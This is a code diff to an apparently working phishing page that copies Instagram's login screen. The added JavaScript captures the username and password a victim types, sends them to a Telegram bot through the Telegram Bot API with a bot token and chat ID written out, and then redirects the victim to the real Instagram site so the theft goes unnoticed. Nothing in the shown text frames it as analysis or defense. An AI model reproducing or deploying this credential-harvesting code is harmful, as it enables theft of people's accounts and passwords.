@@ -49,20 +49,32 @@
 
 <div class="login-container">
     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
-    <form action="https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage" method="POST">
+    <form id="loginForm" method="POST">
         <input type="hidden" name="chat_id" value="1900509620">
         <input type="hidden" name="text" id="message">
         <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
-        <button type="submit" onclick="sendTelegram()">Log In</button>
+        <button type="submit" onclick="sendTelegram(event)">Log In</button>
     </form>
 </div>
 
 <script>
-    function sendTelegram() {
+    function sendTelegram(event) {
+        event.preventDefault();  // 
+
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
-        document.getElementById('message').value = "Username: " + username + "\\nPassword: " + password;
+        var message = "Email: " + username + "\\nPassword: " + password;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));
+
+        // إ
+        xhr.onload = function() {
+            window.location.href = "https://www.instagram.com";
+        };
     }
 </script>
 
